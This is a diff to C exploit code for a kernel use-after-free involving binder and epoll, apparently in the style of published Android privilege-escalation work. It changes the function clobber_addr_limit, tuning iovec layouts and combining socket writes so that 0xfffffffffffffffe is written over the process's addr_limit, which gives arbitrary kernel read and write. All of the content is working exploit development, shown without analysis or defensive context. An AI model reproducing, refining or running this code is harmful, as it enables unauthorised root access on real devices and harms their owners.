@@ -152,7 +152,7 @@ void leak_data(void* leakBuffer, int leakAmount)
 
 void clobber_addr_limit(void)
 {
-  int dataBufferSize = MAX(UAF_SPINLOCK, PAGE);
+  int dataBufferSize = MAX(UAF_SPINLOCK+256, PAGE);
   char* dataBuffer = malloc(dataBufferSize); // TODO: free me!
   if (dataBuffer == NULL) err(1, "allocating dataBuffer");
   memset(dataBuffer, 1, dataBufferSize);
@@ -160,7 +160,7 @@ void clobber_addr_limit(void)
   char* uafFill = malloc(UAF_SPINLOCK);
   if (uafFill == NULL) err(1, "allocating uafFill");
   memset(uafFill, 0xC4, UAF_SPINLOCK);
-  char testFill[568-WAITQUEUE_OFFSET-16]; // 600-WAITQUEUE_OFFSET-16];
+  char testFill[6*8]; // 600-WAITQUEUE_OFFSET-16];
   for (int i=0;i<sizeof(testFill);i++) testFill[i]=i;
     
   struct epoll_event event = { .events = EPOLLIN };
@@ -172,7 +172,9 @@ void clobber_addr_limit(void)
   
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
-    sizeof(testFill)*1, /* iov_len (currently in use) */  // wq->task_list->prev
+    sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
+    &testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    8, /* next iov_len (sizeof(addr_limit)) */
     (unsigned long)&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
@@ -180,7 +182,8 @@ void clobber_addr_limit(void)
   
   printf("offset %lx\n", sizeof(testFill));
   unsigned long third_write_chunk[] = {
-    0xfffffffffffffffe /* value to write over addr_limit */
+    0xfffffffffffffffe, /* value to write over addr_limit */
+    0xfffffffffffffffe, /* value to write over addr_limit */
   };
   
   int initialSize = 4096*17 - UAF_SPINLOCK-sizeof(testFill);
@@ -193,10 +196,10 @@ void clobber_addr_limit(void)
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; // spinlock: will turn to UAF_SPINLOCK
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = testFill; // wq->task_list->next: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(testFill); // wq->task_list->prev: will turn to address of task_list
-  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = &testDatum; // dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
+//  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = dataBuffer; // dataBuffer;
+//  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
   iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = UAF_SPINLOCK;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = UAF_SPINLOCK+sizeof(third_write_chunk);
   int totalLength = iovec_array[IOVEC_INDX_FOR_WQ-2].iov_len+iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len;
  
   int socks[2];
@@ -215,10 +218,17 @@ void clobber_addr_limit(void)
     epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
     
-    write(socks[1], uafFill, initialSize);
+    char* f = malloc(initialSize+UAF_SPINLOCK+sizeof(testFill)+8);
+    memcpy(f,uafFill,initialSize);
+    memcpy(f+initialSize,uafFill,UAF_SPINLOCK);
+    memcpy(f+initialSize+UAF_SPINLOCK,testFill,sizeof(testFill));
+    memcpy(f+initialSize+UAF_SPINLOCK+sizeof(testFill),third_write_chunk,sizeof(third_write_chunk));
+    write(socks[1], f, initialSize+UAF_SPINLOCK+sizeof(testFill)+sizeof(third_write_chunk));
+//    sleep(1);
+/*    write(socks[1], uafFill, initialSize);
     write(socks[1], uafFill, UAF_SPINLOCK);
-    write(socks[1], testFill, sizeof(testFill));
-    write(socks[1], third_write_chunk, sizeof(third_write_chunk));
+    write(socks[1], testFill, sizeof(testFill)); */
+//    write(socks[1], third_write_chunk, sizeof(third_write_chunk));
     printf("CHILD: wrote %lu\n", initialSize+UAF_SPINLOCK+sizeof(testFill)+sizeof(third_write_chunk));
     close(socks[1]);
     exit(0);
